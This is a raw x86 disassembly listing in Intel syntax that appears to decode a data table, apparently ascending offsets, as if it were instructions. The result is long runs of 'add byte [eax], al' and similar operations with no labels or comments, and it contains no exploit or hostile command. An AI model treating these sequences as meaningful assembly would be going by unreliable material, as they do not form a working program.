add byte [eax], al
add byte [eax], al
ljmp 0:0x1d7
add bl, ch
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
in al, dx
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
in eax, dx
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
out dx, al
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
out dx, eax
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
int1
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
hlt
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmc
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
not bh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
not edi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
clc
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
stc
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cli
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sti
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cld
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
std
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
call edi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
or byte [eax], al
add byte [eax], al
or al, 0
add byte [eax], al
sldt word [eax]
add byte [eax + eax], dl
add byte [eax], al
pop ss
add byte [eax], al
add byte [edx], bl
add byte [eax], al
add byte [esi], bl
add byte [eax], al
add byte [0x2c000000], ah
and eax, 0x2c000000
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [esi], bh
add byte [eax], al
add byte [edx], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [edx], cl
add byte [eax], al
dec esi
add byte [eax], al
add byte [edx], dl
add byte [eax], al
push esi
add byte [eax], al
add byte [edx], bl
add byte [eax], al
pop esi
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte gs:[eax], al
add byte [ecx], ch
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
jne 0x80985f2
add byte [eax], al
jns 0x80985f6
add byte [eax], al
jge 0x80985fa
add byte [eax], al
add dword [eax], 0x850000
add byte [eax], al
mov byte [eax], al
add byte [eax], al
mov eax, dword [eax]
add byte [eax], al
mov es, word [eax]
add byte [eax], al
xchg ecx, eax
add byte [eax], al
add byte [eax + eax + 0x970000], dl
add byte [eax], al
lcall 0, 0x9d000000
add byte [eax - 0x5d000000], ah
add byte [eax], al
add byte [esi - 0x57000000], ah
add byte [eax], al
add byte [eax + eax + 0xaf0000], ch
add byte [eax], al
mov dl, 0
add byte [eax], al
mov ah, 0
add byte [eax], al
mov bh, 0
add byte [eax], al
mov edx, 0xbd000000
add byte [eax], al
add al, al
add byte [eax], al
add ah, al
add byte [eax], al
add bh, al
add byte [eax], al
add dl, cl
add byte [eax], al
add ch, cl
add byte [eax], al
add al, dl
add byte [eax], al
add bl, dl
add byte [eax], al
add dh, dl
add byte [eax], al
add cl, bl
add byte [eax], al
add ch, bl
add byte [eax], al
add al, ah
add byte [eax], al
add bl, ah
add byte [eax], al
add dh, ah
add byte [eax], al
add cl, ch
add byte [eax], al
add ch, ch
add byte [eax], al
add dl, dh
add byte [eax], al
add ch, dh
add byte [eax], al
add al, bh
add byte [eax], al
add ah, bh
add byte [eax], al
add byte [ecx], al
add dword [ecx], eax
add byte [eax], al
add al, 1
add byte [eax], al
pop es
add dword [eax], eax
add byte [ebx], cl
add dword [eax], eax
add byte [edi], cl
add dword [eax], eax
add byte [ebx], dl
add dword [eax], eax
add byte [edi], dl
add dword [eax], eax
add byte [edx], bl
add dword [eax], eax
add byte [ecx + eax], bl
add byte [eax], al
push ds
add dword [eax], eax
add byte [eax], ah
add dword [eax], eax
add byte [edx], ah
add dword [eax], eax
add byte [esi], ah
add dword [eax], eax
add byte [ebx], ch
add dword [eax], eax
add byte [eax], dh
add dword [eax], eax
add byte [0x38000001], dh
add dword [eax], eax
add byte [0x42000001], bh
add dword [eax], eax
add byte [ebp + 1], al
add byte [eax], al
dec eax
add dword [eax], eax
add byte [ebx + 1], cl
add byte [eax], al
dec esi
add dword [eax], eax
add byte [ecx + 1], dl
add byte [eax], al
push esp
add dword [eax], eax
add byte [edi + 1], dl
add byte [eax], al
pop edx
add dword [eax], eax
add byte [ebp + 1], bl
add byte [eax], al
pushal
add dword [eax], eax
add byte [ecx + eax], ah
add byte [edi + 1], ah
add byte [eax], al
push 1
add byte [eax], al
insd dword es:[edi], dx
add dword [eax], eax
add byte [eax + 1], dh
add byte [eax], al
jae 0x8098727
add byte [eax], al
add byte [eax + 1], bh
add byte [eax], al
add byte [esi + 1], bh
add byte [eax], al
add byte [ecx - 0x79ffffff], al
add dword [eax], eax
add byte [ecx - 0x73ffffff], cl
add dword [eax], eax
add byte [edi - 0x6dffffff], cl
add dword [eax], eax
add byte [ebp - 0x67ffffff], dl
add dword [eax], eax
add byte [ebx - 0x61ffffff], bl
add dword [eax], eax
add byte [ecx - 0x5bffffff], ah
add dword [eax], eax
add byte [edi - 0x55ffffff], ah
add dword [eax], eax
add byte [ebp - 0x4fffffff], ch
add dword [eax], eax
add byte [ebx - 0x45ffffff], dh
add dword [eax], eax
add cl, al
add dword [eax], eax
add al, cl
add dword [eax], eax
add bh, cl
add dword [eax], eax
add dh, dl
add dword [eax], eax
add ch, bl
add dword [eax], eax
add ah, ah
add dword [eax], eax
add bl, ch
add dword [eax], eax
add dl, dh
add dword [eax], eax
add cl, bh
add dword [eax], eax
add byte [eax], al
add al, byte [eax]
add byte [edi], al
add al, byte [eax]
add byte [edx + eax], cl
add byte [eax], al
lar eax, word [eax]
add byte [ebx], dl
add al, byte [eax]
add byte [eax], bl
add al, byte [eax]
add byte [edx + eax], bl
add byte [eax], al
pop ds
add al, byte [eax]
add byte [ebx], ah
add al, byte [eax]
add byte [eax], ch
add al, byte [eax]
add byte [esi], ch
add al, byte [eax]
add byte [edx], dh
add al, byte [eax]
add byte [0x39000002], dh
add al, byte [eax]
add byte [esi], bh
add al, byte [eax]
add byte [ecx + 2], al
add byte [eax], al
inc esp
add al, byte [eax]
add byte [edi + 2], al
add byte [eax], al
dec edx
add al, byte [eax]
add byte [ebp + 2], cl
add byte [eax], al
push ecx
add al, byte [eax]
add byte [esi + 2], dl
add byte [eax], al
pop edx
add al, byte [eax]
add byte [ebp + 2], bl
add byte [eax], al
popal
add al, byte [eax]
add byte [esi + 2], ah
add byte [eax], al
insb byte es:[edi], dx
add al, byte [eax]
add byte [eax + 2], dh
add byte [eax], al
jae 0x8098810
add byte [eax], al
ja 0x8098814
add byte [eax], al
jl 0x8098818
add byte [eax], al
jg 0x809881c
add byte [eax], al
add byte [edx], 0
add byte [ebp - 0x77fffffe], al
add al, byte [eax]
add byte [edx + eax + 0x2900000], cl
add byte [eax], al
xchg ebp, eax
add al, byte [eax]
add byte [ecx - 0x62fffffe], bl
add al, byte [eax]
add byte [edx - 0x5afffffe], ah
add al, byte [eax]
add byte [eax - 0x54fffffe], ch
add al, byte [eax]
add byte [esi - 0x4efffffe], ch
add al, byte [eax]
add byte [edx + eax + 0x2b70000], dh
add byte [eax], al
mov ebx, 0xbf000002
add al, byte [eax]
add bl, al
add al, byte [eax]
add bh, al
add al, byte [eax]
add ah, cl
add al, byte [eax]
add cl, dl
add al, byte [eax]
add dh, dl
add al, byte [eax]
add bl, bl
add al, byte [eax]
add al, ah
add al, byte [eax]
add ch, ah
add al, byte [eax]
add dl, ch
add al, byte [eax]
add bh, ch
add al, byte [eax]
add ah, dh
add al, byte [eax]
add cl, bh
add al, byte [eax]
add ch, bh
add al, byte [eax]
add byte [ecx], al
add eax, dword [eax]
add byte [0x9000003], al
add eax, dword [eax]
add byte [0x11000003], cl
add eax, dword [eax]
add byte [0x19000003], dl
add eax, dword [eax]
add byte [esi], bl
add eax, dword [eax]
add byte [ebx], ah
add eax, dword [eax]
add byte [eax], ch
add eax, dword [eax]
add byte [0x32000003], ch
add eax, dword [eax]
add byte [edi], dh
add eax, dword [eax]
add byte [ebx + eax], bh
add byte [eax], al
inc ecx
add eax, dword [eax]
add byte [esi + 3], al
add byte [eax], al
dec edx
add eax, dword [eax]
add byte [edi + 3], cl
add byte [eax], al
push esp
add eax, dword [eax]
add byte [eax + 3], bl
add byte [eax], al
pop esp
add eax, dword [eax]
add byte [eax + 3], ah
add byte [eax], al
add eax, dword fs:[eax]
add byte [eax + 3], ch
add byte [eax], al
insd dword es:[edi], dx
add eax, dword [eax]
add byte [eax + 3], dh
add byte [eax], al
je 0x8098905
add byte [eax], al
jns 0x8098909
add eax, dword [eax]
add byte [eax], al
jle 0x809890d
add eax, dword [eax]
add byte [eax], al
add dword [ebx], 0
add eax, dword [eax]
add byte [eax - 0x72fffffd], cl
add eax, dword [eax]
add byte [edx - 0x68fffffd], dl
add eax, dword [eax]
add byte [ebx + eax + 0x3a10000], bl
add byte [eax], al
cmpsd dword [esi], dword ptr es:[edi]
add eax, dword [eax]
add byte [ebp - 0x4cfffffd], ch
add eax, dword [eax]
add byte [ecx - 0x40fffffd], bh
add eax, dword [eax]
add ch, al
add eax, dword [eax]
add bl, cl
add eax, dword [eax]
add cl, dl
add eax, dword [eax]
add bh, dl
add eax, dword [eax]
add ch, bl
add eax, dword [eax]
add bl, ah
add eax, dword [eax]
add al, ch
add eax, dword [eax]
add ch, ch
add eax, dword [eax]
add dl, dh
add eax, dword [eax]
add bh, dh
add eax, dword [eax]
add ah, bh
add eax, dword [eax]
add byte [ecx], al
add al, 0
add byte [esi], al
add al, 0
add byte [ebx], cl
add al, 0
add byte [eax], dl
add al, 0
add byte [esi], dl
add al, 0
add byte [esp + eax], bl
add byte [eax], al
and al, byte [eax + eax]
add byte [eax], ch
add al, 0
add byte [esi], ch
add al, 0
add byte [esp + eax], dh
add byte [eax], al
cmp al, byte [eax + eax]
add byte [eax + 4], al
add byte [eax], al
inc esi
add al, 0
add byte [esp + eax], cl
add byte [edx + 4], dl
add byte [eax], al
push esi
add al, 0
add byte [edx + 4], bl
add byte [eax], al
pop esi
add al, 0
add byte [edx + 4], ah
add byte [eax], al
add al, 0
add byte [edx + 4], ch
add byte [eax], al
outsb dx, byte [esi]
add al, 0
add byte [edx + 4], dh
add byte [eax], al
jbe 0x80989ca
add byte [eax], al
jnp 0x80989ce
add byte [eax], al
add byte [eax + eax], 0
add byte [eax], al
test dword [eax + eax], eax
add byte [edx - 0x70fffffc], cl
add al, 0
add byte [esp + eax + 0x4990000], dl
add byte [eax], al
sahf
add al, 0
add byte [ebx - 0x57fffffc], ah
add al, 0
add byte [ebp - 0x4dfffffc], ch
add al, 0
add byte [edi - 0x43fffffc], dh
add al, 0
add cl, al
add al, 0
add dh, al
add al, 0
add bl, cl
add al, 0
add al, dl
add al, 0
add ch, dl
add al, 0
add dl, bl
add al, 0
add bh, bl
add al, 0
add ah, ah
add al, 0
add cl, ch
add al, 0
add dh, ch
add al, 0
add bl, dh
add al, 0
add al, bh
add al, 0
add ch, bh
add al, 0
add byte [edx], al
add eax, 0x5070000
add byte [eax], al
or al, 5
add byte [eax], al
adc dword [0x5160000], eax
add byte [eax], al
sbb eax, dword [0x5200000]
add byte [eax], al
and eax, 0x2a000005
add eax, 0x52f0000
add byte [eax], al
xor al, 5
add byte [eax], al
cmp dword [0x53e0000], eax
add byte [eax], al
inc ebx
add eax, 0x5480000
add byte [eax], al
dec ebp
add eax, 0x5520000
add byte [eax], al
push edi
add eax, 0x55c0000
add byte [eax], al
popal
add eax, 0x5660000
add byte [eax], al
imul eax, dword [0x5700000], 0
add byte [ebp + 5], dh
add byte [eax], al
jp 0x8098a9b
add byte [eax], al
jg 0x8098a9f
add byte [eax], al
add byte [ebp + eax + 0x5890000], al
add byte [ecx - 0x71fffffb], cl
add byte [eax], al
mov es, word [0x5930000]
add byte [eax], al
cwde
add eax, 0x59d0000
add byte [eax], al
mov byte [0xa7000005], al
add eax, 0x5ac0000
add byte [eax], al
mov cl, 5
add byte [eax], al
mov dh, 5
add byte [eax], al
mov ebx, 0xc0000005
add eax, 0x5c50000
add byte [eax], al
retf 5
add bh, cl
add eax, 0x5d40000
add byte [eax], al
fld dword [0x5de0000]
add byte [eax], al
jecxz 0x8098aef
add byte [eax], al
call 0xf5098af6
add eax, 0x5f20000
add byte [eax], al
test dword [0x5fc0000], 0x6010000
add byte [eax], al
push es
push es
add byte [eax], al
or eax, dword [esi]
add byte [eax], al
adc byte [esi], al
add byte [eax], al
adc eax, 0x1a000006
push es
add byte [eax], al
pop ds
push es
add byte [eax], al
and al, 6
add byte [eax], al
sub dword [esi], eax
add byte [eax], al
push es
add byte [eax], al
xor eax, dword [esi]
add byte [eax], al
cmp byte [esi], al
add byte [eax], al
cmp eax, dword [esi]
add byte [eax], al
push es
add byte [eax], al
inc ecx
push es
add byte [eax], al
inc esp
push es
add byte [eax], al
inc edi
push es
add byte [eax], al
dec edx
push es
add byte [eax], al
dec ebp
push es
add byte [eax], al
push eax
push es
add byte [eax], al
push ebx
push es
add byte [eax], al
push esi
push es
add byte [eax], al
pop ecx
push es
add byte [eax], al
pop esp
push es
add byte [eax], al
popal
push es
add byte [eax], al
push es
add byte [eax], al
push 6
add byte [eax], al
insd dword es:[edi], dx
push es
add byte [eax], al
jo 0x8098b78
add byte [eax], al
jbe 0x8098b7c
add byte [eax], al
jl 0x8098b80
add byte [eax], al
add byte [esi], 0
add byte [eax - 0x71fffffa], cl
push es
add byte [eax], al
xchg esp, eax
push es
add byte [eax], al
lcall 6, 0xa0000006
add byte [esi - 0x53fffffa], ah
push es
add byte [eax], al
mov dl, 6
add byte [eax], al
mov eax, 0xbe000006
push es
add byte [eax], al
les eax, [esi]
add byte [eax], al
retf 6
add al, dl
push es
add byte [eax], al
salc
push es
add byte [eax], al
fadd qword [esi]
add byte [eax], al
loop 0x8098bc4
add byte [eax], al
call 0xf6098bcb
push es
add byte [eax], al
hlt
push es
add byte [eax], al
cli
push es
add byte [eax], al
add byte [edi], al
add byte [eax], al
push es
pop es
add byte [eax], al
or al, 7
add byte [eax], al
adc al, byte [edi]
add byte [eax], al
sbb byte [edi], al
add byte [eax], al
push ds
pop es
add byte [eax], al
and al, 7
add byte [eax], al
sub dword [edi], eax
add byte [eax], al
sub eax, 0x31000007
pop es
add byte [eax], al
pop es
add byte [eax], al
cmp al, byte [edi]
add byte [eax], al
pop es
add byte [eax], al
inc edx
pop es
add byte [eax], al
inc esi
pop es
add byte [eax], al
dec edx
pop es
add byte [eax], al
dec esi
pop es
add byte [eax], al
push edx
pop es
add byte [eax], al
push esi
pop es
add byte [eax], al
pop edx
pop es
add byte [eax], al
pop esi
pop es
add byte [eax], al
arpl word [edi], ax
add byte [eax], al
imul eax, dword [edi], 0x76d0000
add byte [eax], al
jno 0x8098c39
add byte [eax], al
jne 0x8098c3d
add byte [eax], al
jns 0x8098c41
add byte [eax], al
jge 0x8098c45
add byte [eax], al
add dword [edi], 0x7850000
add byte [eax], al
mov al, byte [edi]
add byte [eax], al
pop dword [edi]
add byte [eax], al
xchg esp, eax
pop es
add byte [eax], al
cdq
pop es
add byte [eax], al
popfd
pop es
add byte [eax], al
mov eax, dword [0xa5000007]
pop es
add byte [eax], al
test eax, 0xad000007
pop es
add byte [eax], al
mov cl, 7
add byte [eax], al
mov ch, 7
add byte [eax], al
mov ecx, 0xbd000007
pop es
add byte [eax], al
rol dword [edi], 0
add bh, al
pop es
add byte [eax], al
int 7
add byte [eax], al
rol byte [edi], cl
add byte [eax], al
fadd dword [edi]
add byte [eax], al
fiadd word [edi]
add byte [eax], al
in al, 7
add byte [eax], al
jmp 0xf7098ca4
pop es
add byte [eax], al
hlt
pop es
add byte [eax], al
sti
pop es
add byte [eax], al
inc dword [edi]
add byte [eax], al
add al, 8
add byte [eax], al
or dword [eax], ecx
add byte [eax], al
push cs
or byte [eax], al
add byte [ebx], dl
or byte [eax], al
add byte [edx], bl
or byte [eax], al
add byte [ebx], ah
or byte [eax], al
add byte [edi], ah
or byte [eax], al
add byte [ebx], ch
or byte [eax], al
add byte [edi], ch
or byte [eax], al
add byte [ebx], dh
or byte [eax], al
add byte [edi], dh
or byte [eax], al
add byte [ebx], bh
or byte [eax], al
add byte [edi], bh
or byte [eax], al
add byte [ebx + 8], al
add byte [eax], al
inc edi
or byte [eax], al
add byte [ebx + 8], cl
add byte [eax], al
dec edi
or byte [eax], al
add byte [ebx + 8], dl
add byte [eax], al
push edi
or byte [eax], al
add byte [ebx + 8], bl
add byte [eax], al
pop edi
or byte [eax], al
add byte [ebx + 8], ah
add byte [eax], al
imul ecx, dword [eax], 0x86d0000
add byte [eax], al
jno 0x8098d16
add byte [eax], al
jne 0x8098d1a
add byte [eax], al
jnp 0x8098d1e
add byte [eax], al
or byte [eax], 0
add byte [eax + ecx + 0x8880000], al
add byte [eax], al
mov word [eax], cs
add byte [eax], al
nop
or byte [eax], al
add byte [eax + ecx + 0x8980000], dl
add byte [eax], al
pushfd
or byte [eax], al
add byte [eax - 0x5bfffff8], ah
or byte [eax], al
add byte [eax - 0x52fffff8], ch
or byte [eax], al
add byte [ecx - 0x4afffff8], dh
or byte [eax], al
add byte [edx - 0x40fffff8], bh
or byte [eax], al
add bl, al
or byte [eax], al
add cl, cl
or byte [eax], al
add dh, cl
or byte [eax], al
add dl, dl
or byte [eax], al
add dh, dl
or byte [eax], al
add dl, bl
or byte [eax], al
add dh, bl
or byte [eax], al
add dl, ah
or byte [eax], al
add dh, ah
or byte [eax], al
add dl, ch
or byte [eax], al
add bh, ch
or byte [eax], al
add ah, dh
or byte [eax], al
add al, bh
or byte [eax], al
add bl, bh
or byte [eax], al
add ch, bh
or byte [eax], al
add bh, bh
or byte [eax], al
add byte [ecx], al
or dword [eax], eax
add byte [ebx], al
or dword [eax], eax
add byte [0x7000009], al
or dword [eax], eax
add byte [ecx], cl
or dword [eax], eax
add byte [ebx], cl
or dword [eax], eax
add byte [0xf000009], cl
or dword [eax], eax
add byte [ecx], dl
or dword [eax], eax
add byte [ebx], dl
or dword [eax], eax
add byte [0x17000009], dl
or dword [eax], eax
add byte [ecx], bl
or dword [eax], eax
add byte [ebx], bl
or dword [eax], eax
add byte [esi], bl
or dword [eax], eax
add byte [ecx], ah
or dword [eax], eax
add byte [ecx + ecx], ah
add byte [eax], al
daa
or dword [eax], eax
add byte [edx], ch
or dword [eax], eax
add byte [0x30000009], ch
or dword [eax], eax
add byte [ebx], dh
or dword [eax], eax
add byte [esi], dh
or dword [eax], eax
add byte [ecx], bh
or dword [eax], eax
add byte [ecx + ecx], bh
add byte [eax], al
aas
or dword [eax], eax
add byte [edx + 9], al
add byte [eax], al
inc ebp
or dword [eax], eax
add byte [eax + 9], cl
add byte [eax], al
dec ebx
or dword [eax], eax
add byte [esi + 9], cl
add byte [eax], al
push ecx
or dword [eax], eax
add byte [ecx + ecx], dl
add byte [edi + 9], dl
add byte [eax], al
pop edx
or dword [eax], eax
add byte [ebp + 9], bl
add byte [eax], al
pushal
or dword [eax], eax
add byte [ebx + 9], ah
add byte [eax], al
or word [eax], ax
add byte [eax + 9], ch
add byte [eax], al
imul ecx, dword [ecx], 0
add byte [esi + 9], ch
add byte [eax], al
jno 0x8098e4b
add byte [eax], al
je 0x8098e4f
add byte [eax], al
ja 0x8098e53
add byte [eax], al
jp 0x8098e57
add byte [eax], al
jge 0x8098e5b
add byte [eax], al
or byte [ecx], 0
add byte [ebx - 0x79fffff7], al
or dword [eax], eax
add byte [ecx - 0x73fffff7], cl
or dword [eax], eax
add byte [edi - 0x6dfffff7], cl
or dword [eax], eax
add byte [ebp - 0x67fffff7], dl
or dword [eax], eax
add byte [ebx - 0x61fffff7], bl
or dword [eax], eax
add byte [ecx - 0x5bfffff7], ah
or dword [eax], eax
add byte [edi - 0x55fffff7], ah
or dword [eax], eax
add byte [ebp - 0x4ffffff7], ch
or dword [eax], eax
add byte [ebx - 0x49fffff7], dh
or dword [eax], eax
add byte [ecx - 0x43fffff7], bh
or dword [eax], eax
add byte [edi - 0x3dfffff7], bh
or dword [eax], eax
add ch, al
or dword [eax], eax
add al, cl
or dword [eax], eax
add bl, cl
or dword [eax], eax
add dh, cl
or dword [eax], eax
add cl, dl
or dword [eax], eax
add ah, dl
or dword [eax], eax
add bh, dl
or dword [eax], eax
add dl, bl
or dword [eax], eax
add ch, bl
or dword [eax], eax
add al, ah
or dword [eax], eax
add bl, ah
or dword [eax], eax
add dh, ah
or dword [eax], eax
add cl, ch
or dword [eax], eax
add ah, ch
or dword [eax], eax
add bh, ch
or dword [eax], eax
add dl, dh
or dword [eax], eax
add ch, dh
or dword [eax], eax
add al, bh
or dword [eax], eax
add bl, bh
or dword [eax], eax
add dh, bh
or dword [eax], eax
add byte [ecx], al
or al, byte [eax]
add byte [edx + ecx], al
add byte [eax], al
pop es
or al, byte [eax]
add byte [edx], cl
or al, byte [eax]
add byte [0x1000000a], cl
or al, byte [eax]
add byte [ebx], dl
or al, byte [eax]
add byte [esi], dl
or al, byte [eax]
add byte [ecx], bl
or al, byte [eax]
add byte [edx + ecx], bl
add byte [eax], al
pop ds
or al, byte [eax]
add byte [edx], ah
or al, byte [eax]
add byte [0x2800000a], ah
or al, byte [eax]
add byte [ebx], ch
or al, byte [eax]
add byte [esi], ch
or al, byte [eax]
add byte [ecx], dh
or al, byte [eax]
add byte [edx + ecx], dh
add byte [eax], al
aaa
or al, byte [eax]
add byte [edx], bh
or al, byte [eax]
add byte [0x4000000a], bh
or al, byte [eax]
add byte [ebx + 0xa], al
add byte [eax], al
inc esi
or al, byte [eax]
add byte [ecx + 0xa], cl
add byte [eax], al
dec esp
or al, byte [eax]
add byte [edi + 0xa], cl
add byte [eax], al
push edx
or al, byte [eax]
add byte [ebp + 0xa], dl
add byte [eax], al
pop eax
or al, byte [eax]
add byte [ebx + 0xa], bl
add byte [eax], al
pop esi
or al, byte [eax]
add byte [ecx + 0xa], ah
add byte [eax], al
or al, byte fs:[eax]
add byte [edi + 0xa], ah
add byte [eax], al
push 0xa
add byte [eax], al
insd dword es:[edi], dx
or al, byte [eax]
add byte [eax + 0xa], dh
add byte [eax], al
jae 0x8098fa4
add byte [eax], al
jbe 0x8098fa8
add byte [eax], al
jns 0x8098fac
add byte [eax], al
jl 0x8098fb0
add byte [eax], al
jg 0x8098fb4
add byte [eax], al
or byte [edx], 0
add byte [ebp - 0x77fffff6], al
or al, byte [eax]
add byte [ebx - 0x71fffff6], cl
or al, byte [eax]
add byte [ecx - 0x6bfffff6], dl
or al, byte [eax]
add byte [edi - 0x65fffff6], dl
or al, byte [eax]
add byte [ebp - 0x5ffffff6], bl
or al, byte [eax]
add byte [ebx - 0x59fffff6], ah
or al, byte [eax]
add byte [ecx - 0x53fffff6], ch
or al, byte [eax]
add byte [edi - 0x4dfffff6], ch
or al, byte [eax]
add byte [ebp - 0x47fffff6], dh
or al, byte [eax]
add byte [ebx - 0x41fffff6], bh
or al, byte [eax]
add cl, al
or al, byte [eax]
add ah, al
or al, byte [eax]
add bh, al
or al, byte [eax]
add dl, cl
or al, byte [eax]
add ch, cl
or al, byte [eax]
add al, dl
or al, byte [eax]
add bl, dl
or al, byte [eax]
add dh, dl
or al, byte [eax]
add cl, bl
or al, byte [eax]
add ah, bl
or al, byte [eax]
add bh, bl
or al, byte [eax]
add dl, ah
or al, byte [eax]
add ch, ah
or al, byte [eax]
add al, ch
or al, byte [eax]
add bl, ch
or al, byte [eax]
add dh, ch
or al, byte [eax]
add cl, dh
or al, byte [eax]
add ah, dh
or al, byte [eax]
add bh, dh
or al, byte [eax]
add dl, bh
or al, byte [eax]
add ch, bh
or al, byte [eax]
add byte [eax], al
or eax, dword [eax]
add byte [ebx], al
or eax, dword [eax]
add byte [esi], al
or eax, dword [eax]
add byte [ecx], cl
or eax, dword [eax]
add byte [ebx + ecx], cl
add byte [eax], al
ud2
add byte [eax], al
adc cl, byte [ebx]
add byte [eax], al
adc eax, 0x1800000b
or eax, dword [eax]
add byte [ebx], bl
or eax, dword [eax]
add byte [esi], bl
or eax, dword [eax]
add byte [ecx], ah
or eax, dword [eax]
add byte [ebx + ecx], ah
add byte [eax], al
daa
or eax, dword [eax]
add byte [edx], ch
or eax, dword [eax]
add byte [0x3000000b], ch
or eax, dword [eax]
add byte [ebx], dh
or eax, dword [eax]
add byte [esi], dh
or eax, dword [eax]
add byte [ecx], bh
or eax, dword [eax]
add byte [ebx + ecx], bh
add byte [eax], al
aas
or eax, dword [eax]
add byte [edx + 0xb], al
add byte [eax], al
inc ebp
or eax, dword [eax]
add byte [eax + 0xb], cl
add byte [eax], al
dec ebx
or eax, dword [eax]
add byte [esi + 0xb], cl
add byte [eax], al
push ecx
or eax, dword [eax]
add byte [ebx + ecx], dl
add byte [edi + 0xb], dl
add byte [eax], al
pop edx
or eax, dword [eax]
add byte [ebp + 0xb], bl
add byte [eax], al
pushal
or eax, dword [eax]
add byte [ebx + 0xb], ah
add byte [eax], al
or ax, word [eax]
add byte [ecx + 0xb], ch
add byte [eax], al
insb byte es:[edi], dx
or eax, dword [eax]
add byte [edi + 0xb], ch
add byte [eax], al
jb 0x80990f9
add byte [eax], al
jne 0x80990fd
add byte [eax], al
js 0x8099101
add byte [eax], al
jnp 0x8099105
add byte [eax], al
jle 0x8099109
add byte [eax], al
or dword [ebx], 0xb840000
add byte [eax], al
xchg dword [ebx], ecx
add byte [eax], al
mov cl, byte [ebx]
add byte [eax], al
lea ecx, [ebx]
add byte [eax], al
nop
or eax, dword [eax]
add byte [ebx - 0x69fffff5], dl
or eax, dword [eax]
add byte [ecx - 0x63fffff5], bl
or eax, dword [eax]
add byte [edi - 0x5dfffff5], bl
or eax, dword [eax]
add byte [ebp - 0x57fffff5], ah
or eax, dword [eax]
add byte [ebx - 0x51fffff5], ch
or eax, dword [eax]
add byte [ecx - 0x4bfffff5], dh
or eax, dword [eax]
add byte [edi - 0x45fffff5], dh
or eax, dword [eax]
add byte [ebp - 0x3ffffff5], bh
or eax, dword [eax]
add bl, al
or eax, dword [eax]
add dh, al
or eax, dword [eax]
add cl, cl
or eax, dword [eax]
add ah, cl
or eax, dword [eax]
add bh, cl
or eax, dword [eax]
add dl, dl
or eax, dword [eax]
add ch, dl
or eax, dword [eax]
add al, bl
or eax, dword [eax]
add bl, bl
or eax, dword [eax]
add dh, bl
or eax, dword [eax]
add cl, ah
or eax, dword [eax]
add ah, ah
or eax, dword [eax]
add bh, ah
or eax, dword [eax]
add dl, ch
or eax, dword [eax]
add ch, ch
or eax, dword [eax]
add al, dh
or eax, dword [eax]
add bl, dh
or eax, dword [eax]
add dh, dh
or eax, dword [eax]
add cl, bh
or eax, dword [eax]
add ah, bh
or eax, dword [eax]
add bh, bh
or eax, dword [eax]
add byte [edx], al
or al, 0
add byte [0x800000c], al
or al, 0
add byte [ebx], cl
or al, 0
add byte [esi], cl
or al, 0
add byte [ecx], dl
or al, 0
add byte [esp + ecx], dl
add byte [eax], al
pop ss
or al, 0
add byte [edx], bl
or al, 0
add byte [0x2000000c], bl
or al, 0
add byte [ebx], ah
or al, 0
add byte [esi], ah
or al, 0
add byte [ecx], ch
or al, 0
add byte [esp + ecx], ch
add byte [eax], al
das
or al, 0
add byte [edx], dh
or al, 0
add byte [0x3800000c], dh
or al, 0
add byte [ebx], bh
or al, 0
add byte [esi], bh
or al, 0
add byte [ecx + 0xc], al
add byte [eax], al
inc esp
or al, 0
add byte [edi + 0xc], al
add byte [eax], al
dec edx
or al, 0
add byte [ebp + 0xc], cl
add byte [eax], al
push eax
or al, 0
add byte [ebx + 0xc], dl
add byte [eax], al
push esi
or al, 0
add byte [ecx + 0xc], bl
add byte [eax], al
pop esp
or al, 0
add byte [edi + 0xc], bl
add byte [eax], al
bound ecx, qword [eax + eax]
add byte [ebp + 0xc], ah
add byte [eax], al
push 0x6b00000c
or al, 0
add byte [esi + 0xc], ch
add byte [eax], al
jno 0x809924e
add byte [eax], al
je 0x8099252
add byte [eax], al
ja 0x8099256
add byte [eax], al
jp 0x809925a
add byte [eax], al
jge 0x809925e
add byte [eax], al
or byte [eax + eax], 0
or dword [eax + eax], 0
xchg byte [eax + eax], cl
add byte [ecx - 0x73fffff4], cl
or al, 0
add byte [edi - 0x6dfffff4], cl
or al, 0
add byte [ebp - 0x67fffff4], dl
or al, 0
add byte [ebx - 0x61fffff4], bl
or al, 0
add byte [ecx - 0x5bfffff4], ah
or al, 0
add byte [edi - 0x55fffff4], ah
or al, 0
add byte [ebp - 0x4ffffff4], ch
or al, 0
add byte [ebx - 0x49fffff4], dh
or al, 0
add byte [ecx - 0x43fffff4], bh
or al, 0
add byte [edi - 0x3dfffff4], bh
or al, 0
add ch, al
or al, 0
add al, cl
or al, 0
add bl, cl
or al, 0
add dh, cl
or al, 0
add cl, dl
or al, 0
add ah, dl
or al, 0
add bh, dl
or al, 0
add dl, bl
or al, 0
add ch, bl
or al, 0
add al, ah
or al, 0
add bl, ah
or al, 0
add dh, ah
or al, 0
add cl, ch
or al, 0
add ah, ch
or al, 0
add bh, ch
or al, 0
add dl, dh
or al, 0
add ch, dh
or al, 0
add al, bh
or al, 0
add bl, bh
or al, 0
add dh, bh
or al, 0
add byte [ecx], al
or eax, 0xd040000
